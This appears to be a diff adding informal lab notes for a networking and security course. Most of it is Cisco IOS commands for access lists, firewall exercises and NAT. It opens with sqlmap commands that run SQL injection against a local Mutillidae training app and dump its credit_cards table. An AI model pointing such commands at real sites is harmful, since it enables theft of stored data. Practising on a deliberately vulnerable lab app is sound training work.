@@ -1,0 +1,175 @@
+sudo s
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -D mutillidae --tables
+no
+
+
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
+yes
+
+
+ping www.dlsu.edu.ph 172.67.14.0   104.22.36.0
+ping www.ccp.edu.ph 50.6.160.0     
+ping www.feu.edu.ph 184.168.125.0  
+ping  www.ue.edu.ph 155.137.92.0  
+ping  www.yourschool.edu.ph = _________
+config t
+NO ip access-list standard TODAYONLY
+ip access-list standard TODAYONLY
+DENY   172.67.0.0 0.0.255.255
+DENY   50.6.0.0 0.0.255.255
+DENY   184.168.0.0 0.0.255.255
+DENY   155.137.0.0 0.0.255.255
+DENY   162.214.0.0 0.0.255.255
+Permit Any
+Int Gi 1
+ ip access-group TODAYONLY in
+end
+
+ALLOW ACCESS TO SCHOOLS
+
+config t
+Int gi 1
+ NO ip access-group TODAYONLY in
+ end
+ 
+ YOUR COMPANY IS HAS VERY LOW INTERNET SPEED, BEC OF TORRENTS:
+www.thepiratebay.org   162.159.   104.21
+www.limetorrents.com    172.67.  84.32   104.21
+www.freeanimeonline.com   76.223.  13.248
+www.torlock2.com   104.21.
+www.hentaisites.com 104.21.
+www.iptorrents.com  104.26. 95.211
+ 
+conf t
+NO ip access-list standard NOTORRENT
+ip access-list standard NOTORRENT
+DENY   162.159.0.0   0.0.255.255
+DENY   104.21.0.0   0.0.255.255
+DENY  172.67.0.0   0.0.255.255
+DENY   84.32.0.0   0.0.255.255
+DENY   76.223.0.0   0.0.255.255
+DENY   104.26.0.0   0.0.255.255
+DENY   95.211.0.0   0.0.255.255
+Permit Any
+Int Gi 1
+ ip access-group NOTORRENT in
+end
+
+
+ALLOW ACCESS TO NOTORRENT
+
+config t
+Int gi 1
+ NO ip access-group TODAYONLY in
+ end
+ 
+ 
+ 
+config t
+service timestamps log datetime
+service timestamps debug datetime
+logging 10.11.1.10
+logging trap 5
+
+conf t
+NO IP access-list Extended FWP1
+IP access-list Extended FWP1
+ Permit tcp Any host www.web310.com eq 80 
+ Permit tcp Any host www.web310.com eq 443 
+ Permit icmp Any host www.web310.com 
+ Permit tcp Any host www.web311.com eq 22 
+ Permit tcp Any host www.web311.com eq 443 
+ Permit tcp Any host www.web311.com eq 53 
+ Int Gi 3
+  ip access-group FWP1 in
+  end
+  
+  RMOVE THE FIREWALL POLICY 1
+  conf t
+  Int Gi 3
+  no ip access-group FWP2 in
+  
+  
+  TASK 2: YOUR JOB AS FW ADMIN IN POGO WITH 100K SWELDO:
+  
+  ALLOW only dns, https, of www.web310.com
+  AND allow Only ssh on www.web311.com use
+  
+  
+  NO IP access-list Extended FWP2
+IP access-list Extended FWP2
+ Permit tcp Any host www.web310.com eq 53 
+ Permit tcp Any host www.web310.com eq 443 
+ Permit tcp Any host www.web311.com eq 22 
+ Int Gi 3
+  ip access-group FWP2 in
+  end
+  
+  
+  
+ TASK 3: YOUR JOB AS FW ADMIN IN POGO WITH 100K SWELDO:
+  
+ ALLOW only management port: 22,23,80 of www.web310.com
+  AND allow Only ping[icmp], dns on www.web311.com use
+ 
+CONF T 
+NO IP access-list Extended FWP3
+IP access-list Extended FWP3
+ Permit tcp Any host www.web310.com eq 22 
+ Permit tcp Any host www.web310.com eq 23 
+ Permit tcp Any host www.web310.com eq 80 
+ Permit icmp Any host www.web311.com  
+ Permit tcp Any host www.web311.com eq 53 
+ 
+  Int Gi 3
+  ip access-group FWP3 in
+  end
+  
+  
+  
+ TASK 4: YOUR JOB AS FW ADMIN IN POGO WITH 100K SWELDO:
+  
+ ALLOW only management port:ping,http,https,dns,ssh of www.web310.com
+  AND allow Only ping,telnet,https on www.web311.com use
+ 
+CONF T 
+NO IP access-list Extended POGOPOLICY4
+IP access-list Extended POGOPOLICY4
+ Permit icmp Any host www.web310.com  
+ Permit tcp Any host www.web310.com eq 80 
+ Permit tcp Any host www.web310.com eq 443 
+ Permit tcp Any host www.web310.com eq 53 
+ Permit tcp Any host www.web310.com eq 22 
+ Permit icmp Any host www.web311.com 
+ Permit tcp Any host www.web311.com eq 23 
+ Permit tcp Any host www.web311.com eq 443 
+ 
+  Int Gi 3
+  ip access-group POGOPOLICY4 in
+  end
+  
+   Int Gi 3
+ no ip access-group POGOPOLICY4 in
+  end
+  
+ 
+ 
+ 
+ 
+  
+config t
+no access-list 8
+access-list 8 permit any
+Int Gi 3
+ ip nat Inside
+Int gi 1
+ ip nat Outside
+IP Nat inside source static tcp 192.168.103.21 80 208.8.8.101 8080
+IP Nat inside source static tcp 192.168.103.21 443 208.8.8.101 8443
+IP Nat inside source static tcp 192.168.103.21 22 208.8.8.101 8069
+IP Nat inside source static tcp 192.168.103.22 80 208.8.8.102 8080
+IP Nat inside source static tcp 192.168.103.22 443 208.8.8.102 8443
+IP nat inside source list 8 int gi 1 Overload
+end
+show ip nat translation
